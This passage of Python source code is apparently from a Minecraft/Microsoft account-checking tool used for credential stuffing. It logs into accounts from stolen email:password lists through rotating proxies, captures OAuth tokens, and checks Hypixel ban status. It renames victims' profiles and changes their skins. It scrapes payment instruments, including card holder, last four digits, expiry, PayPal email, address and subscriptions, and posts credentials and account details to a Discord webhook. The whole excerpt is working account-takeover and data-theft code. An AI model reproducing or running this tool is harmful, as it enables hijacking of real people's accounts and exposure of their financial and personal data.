                        if 'multiplayer.access.banned' in error_str or (MINECRAFT_AVAILABLE and isinstance(e, YggdrasilError)):
                             try:
                                 self.banned = f"[Ban] {error_str}"
                             except:
                                 pass
                             return
                    except:
                        pass
                    original_handle_exception(e, exc_info)
                connection._handle_exception = safe_handle_exception
                
                @connection.listener(clientbound_login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    try:
                        data = json.loads(str(packet.json_data))
                        data_str = str(data)
                        if 'temporarily banned' in data_str:
                            try:
                                duration = data['extra'][4]['text'].strip()
                                ban_id = data['extra'][8]['text'].strip()
                                self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                            except:
                                self.banned = "Temporarily Banned"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'Suspicious activity' in data_str:
                            try:
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Suspicious activity"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'You are permanently banned from this server!' in data_str:
                            try:
                                reason = data['extra'][2]['text'].strip()
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Banned"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'The Hypixel Alpha server is currently closed!' in data_str:
                            self.banned = 'False'
                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        elif 'Failed cloning your SkyBlock data' in data_str:
                            self.banned = 'False'
                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        else:
                            extra_list = data.get('extra', [])
                            full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                            if not full_msg:
                                full_msg = data.get('text', '')
                            self.banned = full_msg if full_msg else str(data)
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                    except Exception as e:
                        self.banned = f"Error parsing ban: {str(e)}"
                
                @connection.listener(clientbound_play.DisconnectPacket, early=True)
                def play_disconnect(packet):
                    login_disconnect(packet)

                def _mark_unbanned(packet_name):
                    if self.banned is None:
                        self.banned = 'False'
                        write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('unbanned')
                            ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
                        def delayed_disconnect():
                            time.sleep(1.0)
                            connection.disconnect()
                        threading.Thread(target=delayed_disconnect).start()
                @connection.listener(clientbound_play.JoinGamePacket, early=True)
                def joined_server(packet):
                    _mark_unbanned('JoinGame')
                @connection.listener(clientbound_play.KeepAlivePacket, early=True)
                def keep_alive(packet):
                    _mark_unbanned('KeepAlive')
                @connection.listener(clientbound_play.PlayerPositionAndLookPacket, early=True)
                def position_look(packet):
                    _mark_unbanned('PosLook')
                @connection.listener(clientbound_play.TimeUpdatePacket, early=True)
                def time_update(packet):
                    _mark_unbanned('TimeUpdate')
                @connection.listener(clientbound_play.RespawnPacket, early=True)
                def respawn(packet):
                    _mark_unbanned('Respawn')
                try:
                    try:
                        connected = False
                        if len(banproxies) > 0:
                            with proxy_lock:
                                proxy = random.choice(banproxies)
                                if '@' in proxy:
                                    atsplit = proxy.split('@')
                                    socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                                else:
                                    ip_port = proxy.split(':')
                                    socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                                socket.socket = socks.socksocket
                                connection.connect()
                        else:
                            connection.connect()

                        connected = True
                        c = 0
                        while self.banned == None and c < 3000:
                            time.sleep(0.01)
                            c += 1
                        connection.disconnect()
                    except:
                        pass
                    
                    if self.banned is None:
                        self.banned = '[Error] Connection Timeout/No Packet'

                    if self.banned and str(self.banned).startswith('[Error]'):
                        if tries < maxretries - 1:
                            self.banned = None
                            time.sleep(1)
                            tries += 1
                            continue

                    if self.banned != None:
                        break
                    tries += 1
                except Exception:
                    pass
        except Exception:
            errors += 1
    def setname(self):
        name_format = config.get('name')
        newname = name_format
        while '{random_letter}' in newname:
            newname = newname.replace('{random_letter}', random.choice(string.ascii_lowercase), 1)
        while '{random_number}' in newname:
            newname = newname.replace('{random_number}', random.choice(string.digits), 1)
        while '{random_string}' in newname:
            newname = newname.replace('{random_string}', ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)), 1)
        if newname == name_format and len(newname) < 13:
            newname = f"{newname}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}"
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put('https://api.minecraftservices.com/minecraft/profile/name/' + newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET MC]'
                    self.name = self.name + f' -> {newname}'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {'url': config.get('skin'), 'variant': config.get('variant')}
                changereq = self.session.post('https://api.minecraftservices.com/minecraft/profile/skins', json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET SKIN]'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def build_json_capture(self):
        capture_data = {'username': self.name if self.name != 'N/A' else '', 'hypixel_rank': self.hypixl if self.hypixl else 'N/A', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
        if capture_data['banned']:
            ban_info = self._parse_ban_info(self.banned)
            if ban_info.get('ban_id'):
                capture_data['ban_id'] = ban_info['ban_id']
            if ban_info.get('duration'):
                capture_data['ban_duration'] = ban_info['duration']
        return capture_data
    def _parse_ban_info(self, ban_text):
        ban_info = {}
        if not ban_text or not isinstance(ban_text, str):
            return ban_info
        ban_id_match = re.search('Ban ID: ([A-Za-z0-9]+)', ban_text)
        if ban_id_match:
            ban_info['ban_id'] = ban_id_match.group(1)
        if 'Permanently' in ban_text or 'permanently' in ban_text:
            ban_info['duration'] = 'Permanently'
            ban_info['ban_days'] = None
        else:
            duration_match = re.search('\\[([^\\]]+)\\]', ban_text)
            if duration_match:
                duration_text = duration_match.group(1)
                if 'Permanently' not in duration_text and 'permanently' not in duration_text:
                    ban_days = self._duration_to_days(duration_text)
                    if ban_days is not None:
                        ban_info['ban_days'] = ban_days
                        ban_info['duration'] = self._format_duration_short(duration_text, ban_days)
                    else:
                        ban_info['duration'] = duration_text
        if 'Suspicious activity' in ban_text:
            ban_info['reason'] = 'Suspicious activity'
        ban_info['full_message'] = ban_text
        return ban_info
    def _format_duration_short(self, original_text, total_days):
        try:
            text_lower = original_text.lower()
            hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
            if hour_matches and 'day' not in text_lower and ('week' not in text_lower) and ('month' not in text_lower):
                total_hours = sum((int(h) for h in hour_matches))
                return f'{total_hours}h'
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            if week_matches and 'day' not in text_lower and ('month' not in text_lower):
                total_weeks = sum((int(w) for w in week_matches))
                return f'{total_weeks}w'
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            if month_matches and 'week' not in text_lower and ('day' not in text_lower):
                total_months = sum((int(m) for m in month_matches))
                if total_months == 1:
                    return '4w'
                return f'{total_months * 30}d'
            return f'{total_days}d'
        except:
            return original_text
    def _duration_to_days(self, text):
        if not text:
            return None
        try:
            text_lower = text.lower()
            total_days = 0
            day_matches = re.findall('(\\d+)\\s*(?:day|days|d)\\b', text_lower)
            for match in day_matches:
                total_days += int(match)
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            for match in week_matches:
                total_days += int(match) * 7
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            for match in month_matches:
                total_days += int(match) * 30
            year_matches = re.findall('(\\d+)\\s*(?:year|years|y)\\b', text_lower)
            for match in year_matches:
                total_days += int(match) * 365
            if total_days == 0:
                hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
                if hour_matches:
                    hours = sum((int(h) for h in hour_matches))
                    total_days = max(1, (hours + 23) // 24)
            return total_days if total_days > 0 else None
        except:
            return None
    def _format_seconds(self, seconds_value):
        try:
            total_seconds = int(seconds_value)
        except Exception:
            return str(seconds_value)
        if total_seconds < 0:
            total_seconds = 0
        days, rem = divmod(total_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        parts = []
        if days:
            parts.append(f'{days}d')
        if hours:
            parts.append(f'{hours}h')
        if minutes:
            parts.append(f'{minutes}m')
        if not parts:
            parts.append(f'{seconds}s')
        return ' '.join(parts)
    def save_json_capture(self):
        try:
            json_data = self.build_json_capture()
            capture_file = os.path.join(f'results/{fname}', 'capture.txt')
            if os.path.exists(capture_file):
                try:
                    with open(capture_file, 'r', encoding='utf-8') as f:
                        all_captures = json.load(f)
                        if not isinstance(all_captures, list):
                            all_captures = []
                except:
                    all_captures = []
            else:
                all_captures = []
            all_captures.append(json_data)
            with open(capture_file, 'w', encoding='utf-8') as f:
                json.dump(all_captures, f, indent=2, ensure_ascii=False)
            if UI_ENABLED and ui:
                ui.log_info(f'Capture saved: {self.email}')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Failed to save capture: {str(e)[:50]}')
    def handle(self, session):
        global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
        if self.name and self.name != 'N/A':
            try:
                self.hypixel()
            except Exception:
                errors += 1
            try:
                self.optifine()
                if self.cape == 'Yes':
                    optifine_capes += 1
            except Exception:
                errors += 1
            if self.capes and self.capes != '':
                minecraft_capes += 1
            try:
                self.full_access()
            except Exception:
                errors += 1
            try:
                self.namechange()
                if self.namechange_available:
                    name_changes += 1
            except Exception:
                errors += 1
            try:
                self.ban(session)
            except Exception:
                errors += 1
            try:
                self.check_microsoft_features()
                if self.ms_payment_methods:
                    payment_methods += len(self.ms_payment_methods)
                if self.inbox_matches:
                    inbox_matches += len(self.inbox_matches)
            except Exception as e:
                errors += 1
            if config.get('setname'):
                try:
                    self.setname()
                except Exception as e:
                    if UI_ENABLED and ui:
                         ui.log_error(f"Setname error: {e}")
        else:
            try:
                self.setname()
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"Setname error: {e}")
                pass
        try:
            self.check_donut_smp()
        except Exception as e:
            errors += 1
            if UI_ENABLED and ui:
                ui.log_info(f'Donut SMP error: {e}')
        if config.get('setskin'):
            try:
                self.setskin()
            except Exception as e:
                if UI_ENABLED and ui:
                     ui.log_error(f"Setskin error: {e}")
        try:
            fullcapt = self.builder(mask_password=False, include_timestamp=False)
            masked_capt = self.builder(mask_password=True, include_timestamp=True)
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"Builder error: {e}")
            fullcapt = f"{self.email}:{self.password}"
            masked_capt = f"{self.email}:***"
        
        try:
            stats_text = fetch_meowapi_stats(self.name, self.uuid)
            if stats_text:
                sw = re.search(r'SW: (\d+)', stats_text)
                if sw: self.swstars = sw.group(1)
                
                nw = re.search(r'NW: ([^ ]+)', stats_text)
                if nw: self.sbnetworth = nw.group(1)
                
                purse = re.search(r'Purse: ([^ ]+)', stats_text)
                if purse: self.sbcoins = purse.group(1)
                
                pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
                if pit: self.pitcoins = pit.group(1)
                
                fullcapt = self.builder(mask_password=False, include_timestamp=False)
                masked_capt = self.builder(mask_password=True, include_timestamp=True)
        except Exception:
            stats_text = None
        try:
            write_dedupe(fname, 'Hits.txt', f'{self.email}:{self.password}\n')
            with stats_lock:
                hits += 1
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"Failed to write Hit: {e}")
        try:
            with file_lock:
                open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
        except:
            pass
        if UI_ENABLED and ui:
            ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
        self.send_discord_webhook()
    def send_discord_webhook(self):
        try:
            enable_notifications = config.get('enable_notifications')
            if enable_notifications is False or str(enable_notifications).lower() == 'false':
                return
            webhook_url = config.get('discord_webhook_url', '')
            if not webhook_url or webhook_url.strip() == '':
                if UI_ENABLED and ui:
                    ui.log_error('[Webhook] No webhook URL configured')
                return
            embed_color = config.get('embed_color_hit', 5763719)
            notification_type = 'Account Hit'
            if 'Xbox Game Pass Ultimate' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass Ultimate'
            elif 'Xbox Game Pass' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass (PC)'
            elif 'Normal Minecraft' in str(self.type):
                embed_color = config.get('embed_color_hit', 5763719)
                notification_type = 'Minecraft Account'
            fields = []
            fields.append({'name': '📧 ᴇᴍᴀɪʟ', 'value': f'`{self.email}`', 'inline': False})
            fields.append({'name': '🔑 ᴘᴀssᴡᴏʀᴅ', 'value': f'`{self.password}`', 'inline': False})
            if self.hypixl and self.hypixl != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.hypixl}`', 'inline': True})
            elif self.name and self.name != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.name}`', 'inline': True})
            if self.type:
                fields.append({'name': ' ᴛʏᴘᴇ', 'value': str(self.type), 'inline': True})
            if self.capes and self.capes != '':
                fields.append({'name': ' ᴄᴀᴘᴇs', 'value': str(self.capes), 'inline': True})
            if self.level:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ ʟᴇᴠᴇʟ', 'value': str(self.level), 'inline': True})
            if self.bwstars and int(self.bwstars) > 0:
                fields.append({'name': ' ʙᴇᴅᴡᴀʀ sᴛᴀʀs', 'value': str(self.bwstars), 'inline': True})
            if self.sbcoins:
                fields.append({'name': ' sᴋʏʙʟᴏᴄᴋ ᴄᴏɪɴs', 'value': str(self.sbcoins), 'inline': True})
            fields.append({'name': ' ᴏᴘᴛɪғɪɴᴇ ᴄᴀᴘᴇ', 'value': ' Yes' if self.cape and self.cape == 'Yes' else ' No', 'inline': True})
            if self.namechanged and self.namechanged == 'True':
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' Yes', 'inline': True})
            elif self.namechanged is not None:
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' No', 'inline': True})
            if self.banned and self.banned != 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': f'🚫 {self.banned}', 'inline': True})
            elif self.banned == 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '✅ Not Banned', 'inline': True})
            else:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '❓ Unknown', 'inline': True})
            if self.access:
                access_emoji = '✅' if self.access == 'True' else '❌'
                fields.append({'name': ' ᴇᴍᴀɪʟ ᴀᴄᴄᴇss', 'value': f'{access_emoji} {self.access}', 'inline': True})
            embed = {'title': f' {notification_type} ', 'color': embed_color, 'fields': fields, 'timestamp': datetime.utcnow().isoformat()}
            try:
                if config.get('embed_image_enabled', True):
                    uuid_val = getattr(self, 'uuid', None)
                    template = config.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip')
                    if '{uuid}' in str(template):
                        if uuid_val and str(uuid_val).strip() and (str(uuid_val) != 'N/A'):
                            img_url = str(template).format(uuid=uuid_val)
                        else:
                            img_url = None
                    else:
                        img_url = str(template)
                    if img_url:
                        embed['image'] = {'url': img_url}
            except Exception:
                pass
            try:
                if config.get('embed_thumbnail', True):
                    thumb_url = config.get('embed_thumbnail_url', config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
                    embed['thumbnail'] = {'url': thumb_url}
            except Exception:
                pass
            try:
                if config.get('embed_footer', True):
                    footer_text = config.get('webhook_username', 'MeowMal Checker')
                    footer_icon = config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')
                    embed['footer'] = {'text': footer_text, 'icon_url': footer_icon}
            except Exception:
                pass
            payload = {'username': config.get('webhook_username', 'MeowMal Checker'), 'avatar_url': config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'), 'embeds': [embed]}
            response = requests.post(webhook_url, json=payload, timeout=15)
            if response.status_code == 204:
                pass
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_error(f'⚠ Webhook rate limited - wait and retry')
            elif response.status_code == 400:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook bad request: {response.text[:200]}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook URL not found - check config.ini')
            elif UI_ENABLED and ui:
                ui.log_error(f'✗ Webhook failed: {response.status_code} - {response.text[:100]}')
        except requests.exceptions.Timeout:
            if UI_ENABLED and ui:
                ui.log_error('[Webhook] Request timeout - Discord may be slow')
        except requests.exceptions.ConnectionError:
            if UI_ENABLED and ui:
                ui.log_error('[Webhook] Connection error - check internet')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')
def get_urlPost_sFTTag(session):
    global retries
    attempts = 0
    while attempts < maxretries:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
            timeout_val = int(config.get('timeout', 10))
            text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
            
            match = RE_SFTTAG_VALUE.search(text)
            if match:
                sFTTag = next((g for g in match.groups() if g is not None), None)
                if sFTTag:
                    match_url = RE_URLPOST_VALUE.search(text)
                    if match_url:
                        urlPost = next((g for g in match_url.groups() if g is not None), None)
                        if urlPost:
                            urlPost = urlPost.replace('&amp;', '&')
                            return (urlPost, sFTTag, session)
        except:
            pass
        session.proxies = getproxy()
        retries += 1
        attempts += 1
        time.sleep(0.1)
    return (None, None, session)
def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif 'cancel?mkt=' in login_request.text:
                ipt = RE_IPT.search(login_request.text).group()
                pprid = RE_PPRID.search(login_request.text).group()
                uaid = RE_UAID.search(login_request.text).group()
                data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
                
                action_url = RE_ACTION_FMHF.search(login_request.text).group()
                ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
                
                return_url = RE_RETURN_URL.search(ret.text).group()
                fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    return (token, session)
            elif any((value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt='])):
                with open(f'results/{fname}/2fa.txt', 'a') as file:
                    file.write(f'{email}:{password}\n')
                return ('2FA', session)
            elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password", 'help us protect your account'])):
                return ('None', session)
            else:
                session.proxies = getproxy()
                retries += 1
                tries += 1
                time.sleep(0.1)
        except Exception as e:
            session.proxies = getproxy()
            retries += 1
            tries += 1
            time.sleep(0.1)
    return ('None', session)
def payment(session, email, password):
    global retries, payment_methods, hits, config
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            headers = {'Host': 'login.live.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Referer': 'https://account.microsoft.com/'}
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers, timeout=int(config.get('timeout', 10)))
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36', 'Pragma': 'no-cache', 'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Authorization': f'MSADELEGATE1.0={token}', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Host': 'paymentinstruments.mp.microsoft.com', 'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2', 'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Sec-GPC': '1'}
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=int(config.get('timeout', 10)))
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + '(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match:
                    return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ''
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item:
                        city = item['city']
                    if 'region' in item:
                        region = item['region']
                    if 'postal_code' in item:
                        zipcode = item['postal_code']
                    if 'cardType' in item:
                        card_type = item['cardType']
                    if 'country' in item:
                        cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f'[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]'
            cc_info = f'[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]'
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None:
                parts.append(f'Purchased Item: {item1}')
            if auto_renew is not None:
                parts.append(f'Auto Renew: {auto_renew}')
            if start_date is not None:
                parts.append(f'startDate: {start_date}')
            if next_renewal_date is not None:
                parts.append(f'Next Billing: {next_renewal_date}')
            if parts:
                subscription1 = f"[ {' | '.join(parts)} ]"
            else:
                subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None:
                parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None:
                parts2.append(f'Auto Renew: {auto_renew2}')
            if start_date2 is not None:
                parts2.append(f'startDate: {start_date2}')
            if recurring is not None:
                parts2.append(f'Recurring: {recurring}')
            if next_renewal_date2 is not None:
                parts2.append(f'Next Billing: {next_renewal_date2}')
            if parts:
                subscription2 = f"[{' | '.join(parts2)}]"
            else:
                subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {'PASS': 'XBOX GAME PASS', 'GOLD': 'XBOX GOLD'}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None:
                total_amount = total_amount_value + f' {currency}'
            else:
                total_amount = f'0 {currency}'
            parts3 = []
            if description is not None:
                parts3.append(f'Product: {description}')
            if product_type is not None:
                parts3.append(f'Product Type: {product_type}')
            if quantity is not None:
                parts3.append(f'Total Purchase: {quantity}')
            if total_amount is not None:
                parts3.append(f'Total Price: {total_amount}')
            if parts:
                subscription3 = f"[ {' | '.join(parts3)} ]"
            else:
                subscription3 = None
            payment = ''
            paymentprint = ''
            has_payment_method = False
            if date_registered:
                payment += f'\nDate Registered: {date_registered}'
                paymentprint += f' | Date Registered: {date_registered}'
            if fullname:
                payment += f'\nFullname: {fullname}'
                paymentprint += f' | Fullname: {fullname}'
            if user_address:
                payment += f'\nUser Address: {user_address}'
                paymentprint += f' | User Address: {user_address}'
            if paypal_email:
                payment += f'\nPaypal Email: {paypal_email}'
                paymentprint += f' | Paypal Email: {paypal_email}'
                has_payment_method = True
            if cc_info and credit_card:
                payment += f'\nCC Info: {cc_info}'
                paymentprint += f' | CC Info: {cc_info}'
                has_payment_method = True
            if balance:
                payment += f'\nBalance: {balance}'
                paymentprint += f' | Balance: {balance}'
            if subscription1:
                payment += f'\n{subscription1}'
                paymentprint += f' | {subscription1}'
            if subscription2:
                payment += f'\n{subscription2}'
                paymentprint += f' | {subscription2}'
            if subscription3:
                payment += f'\n{subscription3}'
                paymentprint += f' | {subscription3}'
            if has_payment_method or balance or subscription1 or subscription2 or subscription3:
                if credit_card and last4:
                    card_capture = f'{email}:{password} | Card: {credit_card} | Last4: {last4} | Exp: {expiry_month}/{expiry_year} | Type: {card_type} | Holder: {card_holder}'
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
